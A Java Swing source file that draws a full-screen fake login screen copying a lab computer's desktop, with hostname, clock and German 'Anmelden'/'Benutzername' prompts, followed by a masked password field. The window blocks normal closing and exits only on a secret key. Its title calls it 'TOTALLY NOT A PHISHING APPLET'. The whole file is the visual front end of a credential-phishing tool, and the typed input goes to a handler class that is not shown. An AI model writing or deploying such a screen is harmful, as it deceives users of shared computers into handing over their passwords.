package code;
import java.awt.AWTException;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.RenderingHints;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.sql.Date;
import java.text.SimpleDateFormat;

import javax.imageio.ImageIO;
import javax.swing.JFrame;
import javax.swing.JOptionPane;


public class Frame extends JFrame
{
	private static final long serialVersionUID = 1L;
	static File imageFile;
	static File imageFile2, wmFile;
	static Font font;
	static Interface i;
	static BufferedImage image;
	static BufferedImage image2;
	static BufferedImage wm;
	static boolean img = true;
	static int width, height;
	static GraphicsDevice device = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()[0];
	@SuppressWarnings("static-access")
	public Frame() throws AWTException
	{	
		if(JOptionPane.showInputDialog("IMAGE: ").equals("1"))img = false;
		i = new Interface();
		
		imageFile  = new File("/home/kfg/Home_auf_Server/img1.png");
		imageFile2 = new File("/home/kfg/Home_auf_Server/img2.png");
		wmFile = new File("/home/kfg/Home_auf_Server/logo.png");
		try {
			image = ImageIO.read(imageFile);
			image2 = ImageIO.read(imageFile2);
			wm = ImageIO.read(wmFile);
			
		} catch (IOException e) {
			e.printStackTrace();
		}
		this.setTitle("TOTALLY NOT A PHISHING APPLET");
		this.setUndecorated(true);
		Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
		width = (int)screenSize.getWidth();
		height =(int)screenSize.getHeight();
		this.setDefaultCloseOperation(this.DO_NOTHING_ON_CLOSE);
		device.setFullScreenWindow(this);
		this.setVisible(true);
		this.addKeyListener(i);
		
	}
	public void drawBar(Graphics g)
	{
		g.setColor(new Color(0,0,0,80));
		g.fillRect(0, 0, width, 25);
		font = new Font("Serial", Font.BOLD, 14);
		g.setFont(font);
		g.setColor(Color.BLACK);
		g.drawString("sr102-pc24",18, 18);
		g.setColor(Color.WHITE);
		g.drawString("sr102-pc24",18, 19);
		g.setColor(Color.WHITE);
		SimpleDateFormat sdfTime = new SimpleDateFormat("HH:mm");
	    Date now = new Date(System.currentTimeMillis());
	    font = new Font("Ubuntu 11", Font.BOLD, 14);
		g.setFont(font);
		g.drawString(sdfTime.format(now), width-50, 18);
	}
	@SuppressWarnings("static-access")
	@Override
	public void paint(Graphics fin)
	{
		BufferedImage screen = new BufferedImage(this.getWidth(), this.getHeight(), BufferedImage.TYPE_INT_RGB);
		Graphics g = screen.getGraphics();
		if(i.typedText.equals("ü"))
		{
			System.exit(0);
		}
	    Graphics2D g2 = (Graphics2D)g;
	    RenderingHints rh = new RenderingHints(
	             RenderingHints.KEY_TEXT_ANTIALIASING,
	             RenderingHints.VALUE_TEXT_ANTIALIAS_ON);
	    g2.setRenderingHints(rh);
	    
	    if(img)
	    {
	    	float pos = (float)(width /2f)- (float)(image.getWidth()/2f);
	    	g.drawImage(image,(int)pos ,0, image.getWidth(), height,  null);
	   
	    }else
	    {
	    	float pos = (float)(width /2f)- (float)(image2.getWidth()/2f);
	    	g.drawImage(image2, (int)pos,0,image2.getWidth(), height,  null);
	    }
	    if(img)
	    {
		    int scale = 40;
		    for(int x = 0; x < 100; x++)
			{
				for(int y = 0; y < 100; y++)
				{
					g.setColor(new Color(255,255,255,70));
					g.fillRect(x*scale+1, y*scale-2, 2,2);
				}
			}
	    }
	    g.drawImage(wm, 10, height-100, null);
		g.setColor(new Color(0,0,0,80));
		g.fillRoundRect(100, 457, 300, 108, 20, 20);
		g.fillRoundRect(110, 517, 280, 40, 10, 10);
		drawBar(g);
		g.setColor(Color.white);
		g.drawRoundRect(110, 517, 280, 40, 10, 10);
		font = new Font("Serial", Font.BOLD, 15);
		g.setColor(Color.GRAY);
		g.setFont(font);
		
		if(i.typedText=="")
		{
			if(!i.möö)
			{
				g.drawString("Benutzername",117, 542);
				g.setColor(Color.WHITE);
				g.drawLine(117, 524, 117, 545);
				font = new Font("Serial", Font.BOLD, 16);
				g.setColor(Color.WHITE);
				g.setFont(font);
				g.drawString("Anmelden",110, 482);
			}else
			{
				font = new Font("Serial", Font.BOLD, 16);
				g.setColor(Color.WHITE);
				g.setFont(font);
				g.drawString(i.usn,110, 482);
				font = new Font("Serial", Font.BOLD, 15);
				g.setColor(Color.GRAY);
				g.setFont(font);
				g.drawString("Password",117, 542);
			}
			
		}else
		{
			g.setColor(Color.WHITE);
			if(!i.möö)
			{
				g.setColor(Color.WHITE);
				g.drawString(i.typedText,117, 542);
				g.setColor(Color.WHITE);
				font = new Font("Serial", Font.BOLD, 16);
				g.setFont(font);
				g.drawString("Anmelden",110, 482);
			}else
			{
				font = new Font("Serial", Font.BOLD, 16);
				g.setColor(Color.WHITE);
				g.setFont(font);
				g.drawString(i.usn,110, 482);
				String s = "";
				for(int j = 0; j < i.typedText.length(); j++)
				{
					s += "•";
				}
				g.drawString(s, 117, 542);
			}
			
		}	
		fin.drawImage(screen, 0, 0, null);
	}
}
